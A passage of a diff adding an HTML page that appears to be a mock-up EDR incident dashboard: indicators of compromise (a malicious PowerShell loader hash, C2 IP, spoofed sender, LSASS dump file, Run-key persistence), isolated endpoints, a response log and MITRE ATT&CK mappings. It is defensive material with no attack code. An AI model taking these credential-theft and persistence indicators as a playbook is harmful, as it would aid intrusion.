+                <td class="t trunc" title="c41d8f0a6b2e93745af10c8d3e2b5f9071aa46c8d215e3b7904f6ac128db5e33">c41d8f0a6b2e9374…28db5e33<span class="sub">loader.ps1 (AppData)</span></td>
+                <td class="t">09:12:19</td>
+                <td><span class="pill sev-crit"><span class="dot" aria-hidden="true"></span>Malicious</span><span class="sub">44 / 68 vendors</span></td>
+                <td>Blocked org-wide</td>
+              </tr>
+              <tr>
+                <td>IPv4</td>
+                <td class="t">185.34.212.9<span class="sub">AS204601 · Seychelles</span></td>
+                <td class="t">09:14:51</td>
+                <td><span class="pill sev-crit"><span class="dot" aria-hidden="true"></span>C2 infrastructure</span><span class="sub">Known since 12 Jul</span></td>
+                <td>Blocked at firewall</td>
+              </tr>
+              <tr>
+                <td>Domain</td>
+                <td class="t">updates-cdn-sync.net<span class="sub">Registered 9 days ago</span></td>
+                <td class="t">09:11:52</td>
+                <td><span class="pill sev-high"><span class="dot" aria-hidden="true"></span>Suspicious</span><span class="sub">Newly observed</span></td>
+                <td>Sinkholed</td>
+              </tr>
+              <tr>
+                <td>Sender</td>
+                <td class="t">accounts@vendor-billing-desk.net</td>
+                <td class="t">09:02:10</td>
+                <td><span class="pill sev-high"><span class="dot" aria-hidden="true"></span>Spoofed vendor</span><span class="sub">SPF fail</span></td>
+                <td>Pending gateway block</td>
+              </tr>
+              <tr>
+                <td>File path</td>
+                <td class="t trunc" title="C:\Windows\Temp\dbg_748.tmp">C:\Windows\Temp\dbg_748.tmp<span class="sub">42 MB LSASS dump</span></td>
+                <td class="t">09:14:24</td>
+                <td><span class="pill sev-med"><span class="dot" aria-hidden="true"></span>Evidence</span><span class="sub">Held for analysis</span></td>
+                <td>Quarantined</td>
+              </tr>
+              <tr>
+                <td>Registry</td>
+                <td class="t trunc" title="HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSyncHost">HKCU\…\Run\OneDriveSyncHost</td>
+                <td class="t">09:12:20</td>
+                <td><span class="pill sev-high"><span class="dot" aria-hidden="true"></span>Persistence</span><span class="sub">Autorun value</span></td>
+                <td>Pending rollback</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="panel table-wrap" id="p-assets" role="tabpanel" aria-labelledby="tab-assets" hidden>
+          <table>
+            <thead>
+              <tr><th scope="col">Endpoint</th><th scope="col">User</th><th scope="col">Exposure</th><th scope="col">Agent</th><th scope="col">State</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>FIN-WS-0412<span class="sub">Chennai · floor 3</span></td>
+                <td>CORP\r.venkat</td>
+                <td><span class="pill sev-crit"><span class="dot" aria-hidden="true"></span>Compromised</span><span class="sub">Attachment executed</span></td>
+                <td class="t">7.4.1 · healthy</td>
+                <td>Isolated 09:15:03</td>
+              </tr>
+              <tr>
+                <td>FIN-WS-0388<span class="sub">Chennai · floor 3</span></td>
+                <td>CORP\m.abraham</td>
+                <td><span class="pill sev-med"><span class="dot" aria-hidden="true"></span>At risk</span><span class="sub">Attachment delivered, unopened</span></td>
+                <td class="t">7.4.1 · healthy</td>
+                <td>Monitoring</td>
+              </tr>
+              <tr>
+                <td>FIN-LT-0117<span class="sub">Remote · VPN</span></td>
+                <td>CORP\s.natarajan</td>
+                <td><span class="pill sev-med"><span class="dot" aria-hidden="true"></span>At risk</span><span class="sub">Attachment delivered, unopened</span></td>
+                <td class="t">7.3.8 · update due</td>
+                <td>Monitoring</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="panel table-wrap" id="p-log" role="tabpanel" aria-labelledby="tab-log" hidden>
+          <table>
+            <thead>
+              <tr><th scope="col">Time</th><th scope="col">Actor</th><th scope="col">Event</th></tr>
+            </thead>
+            <tbody>
+              <tr><td class="t">09:14:22</td><td>Behaviour analytics</td><td>Detection raised — LSASS handle access with VM_READ</td></tr>
+              <tr><td class="t">09:15:03</td><td>Policy FIN-CRIT-AUTO</td><td>Endpoint isolated, process tree terminated</td></tr>
+              <tr><td class="t">09:16:40</td><td>K. Bala</td><td>Incident acknowledged, triage started</td></tr>
+              <tr><td class="t">09:21:12</td><td>K. Bala</td><td>Hashes submitted to org-wide block list</td></tr>
+              <tr><td class="t">09:24:55</td><td>K. Bala</td><td>Note: awaiting identity team to force credential reset for r.venkat</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+    </div>
+
+    <!-- ============ response rail ============ -->
+    <div class="col rail">
+
+      <section class="card">
+        <header>
+          <h2>Response</h2>
+          <span class="label">4 of 6 complete</span>
+        </header>
+        <div class="actions">
+          <div class="action done">
+            <span class="mark" aria-hidden="true">✓</span>
+            <span class="name">Isolate endpoint<span class="when">09:15:03 · automatic</span></span>
+            <button class="go" disabled>Done</button>
+          </div>
+          <div class="action done">
+            <span class="mark" aria-hidden="true">✓</span>
+            <span class="name">Terminate process tree<span class="when">09:15:03 · automatic</span></span>
+            <button class="go" disabled>Done</button>
+          </div>
+          <div class="action done">
+            <span class="mark" aria-hidden="true">✓</span>
+            <span class="name">Quarantine dump file<span class="when">09:15:11 · automatic</span></span>
+            <button class="go" disabled>Done</button>
+          </div>
+          <div class="action done">
+            <span class="mark" aria-hidden="true">✓</span>
+            <span class="name">Block hashes org-wide<span class="when">09:21:12 · K. Bala</span></span>
+            <button class="go" disabled>Done</button>
+          </div>
+          <div class="action">
+            <span class="mark" aria-hidden="true">·</span>
+            <span class="name">Roll back Run key<span class="when">Persistence still present</span></span>
+            <button class="go" data-toast="Run key OneDriveSyncHost removed from FIN-WS-0412.">Run</button>
+          </div>
+          <div class="action">
+            <span class="mark" aria-hidden="true">·</span>
+            <span class="name">Force credential reset<span class="when">Owned by identity team</span></span>
+            <button class="go" data-toast="Credential reset requested for CORP\r.venkat.">Request</button>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <header><h2>MITRE ATT&amp;CK</h2><span class="label">5 techniques</span></header>
+        <div class="card-body mitre">
+          <div class="mitre-item">
+            <div class="nm">Spearphishing attachment<span class="ph label">Initial access</span></div>
+            <span class="tech">T1566.001</span>
+          </div>
+          <div class="mitre-item">
+            <div class="nm">PowerShell<span class="ph label">Execution</span></div>
+            <span class="tech">T1059.001</span>
+          </div>
+          <div class="mitre-item">
+            <div class="nm">Registry run keys<span class="ph label">Persistence</span></div>
+            <span class="tech">T1547.001</span>
+          </div>
+          <div class="mitre-item">
+            <div class="nm">LSASS memory<span class="ph label">Credential access</span></div>
+            <span class="tech">T1003.001</span>
+          </div>
+          <div class="mitre-item">
+            <div class="nm">Exfiltration over C2<span class="ph label">Exfiltration</span></div>
+            <span class="tech">T1041</span>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <header><h2>Detection sources</h2><span class="label">Signal contribution</span></header>
+        <div class="card-body coverage">
+          <div class="cov-row">
+            <span class="label">Behaviour</span>
+            <div class="cov-bar"><i style="width: 94%"></i></div>
+            <span class="v">94</span>
+          </div>
+          <div class="cov-row">
+            <span class="label">Memory scan</span>
+            <div class="cov-bar"><i style="width: 88%"></i></div>
+            <span class="v">88</span>
+          </div>
+          <div class="cov-row">
+            <span class="label">Network</span>
+            <div class="cov-bar"><i style="width: 71%"></i></div>
+            <span class="v">71</span>
+          </div>
+          <div class="cov-row">
+            <span class="label">Reputation</span>
+            <div class="cov-bar"><i style="width: 63%"></i></div>
+            <span class="v">63</span>
+          </div>
+          <div class="cov-row">
+            <span class="label">Signature</span>
+            <div class="cov-bar"><i style="width: 12%"></i></div>
+            <span class="v">12</span>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <header><h2>Case</h2></header>
+        <div class="card-body meta-list">
+          <div class="meta-row"><span class="label">Assignee</span><div>K. Bala — Tier 2</div></div>
+          <div class="meta-row"><span class="label">Escalation</span><div>S. Iyer — Tier 3 <span class="sub">Paged 09:26</span></div></div>
+          <div class="meta-row"><span class="label">SLA</span><div class="mono">Contain 15 m · met in 41 s</div></div>
+          <div class="meta-row"><span class="label">Ticket</span><div><a href="#">SOC-8842</a> <span class="sub">Linked to CHG-1190</span></div></div>
+          <div class="meta-row"><span class="label">Policy</span><div class="mono">FIN-CRIT-AUTO</div></div>
+        </div>
+      </section>
+    </div>
+  </div>
+
+  <footer class="page-foot">
+    <span>Sentinel EDR · incident INC-2041 · retained 400 days</span>
+    <span>Rendered 27 Jul 2026 09:31 IST</span>
+  </footer>
+</div>
+
+<div class="toast-stack" id="toasts" role="status" aria-live="polite"></div>
+
+<script>
+  // Tabs
+  var tabs = Array.prototype.slice.call(document.querySelectorAll('.tab'));
+  function select(tab) {
+    tabs.forEach(function (t) {
+      var on = t === tab;
+      t.setAttribute('aria-selected', on ? 'true' : 'false');
+      document.getElementById(t.getAttribute('aria-controls')).hidden = !on;
+    });
+  }
+  tabs.forEach(function (t, i) {
+    t.addEventListener('click', function () { select(t); });
+    t.addEventListener('keydown', function (e) {
+      var d = e.key === 'ArrowRight' ? 1 : e.key === 'ArrowLeft' ? -1 : 0;
+      if (!d) return;
+      e.preventDefault();
+      var next = tabs[(i + d + tabs.length) % tabs.length];
+      next.focus();
+      select(next);
+    });
+  });
+
+  // Action feedback
+  var stack = document.getElementById('toasts');
+  document.addEventListener('click', function (e) {
+    var btn = e.target.closest('[data-toast]');
+    if (!btn) return;
+    var el = document.createElement('div');
+    el.className = 'toast';
+    el.textContent = btn.getAttribute('data-toast');
+    stack.appendChild(el);
+    setTimeout(function () { el.remove(); }, 4200);
+  });
+</script>
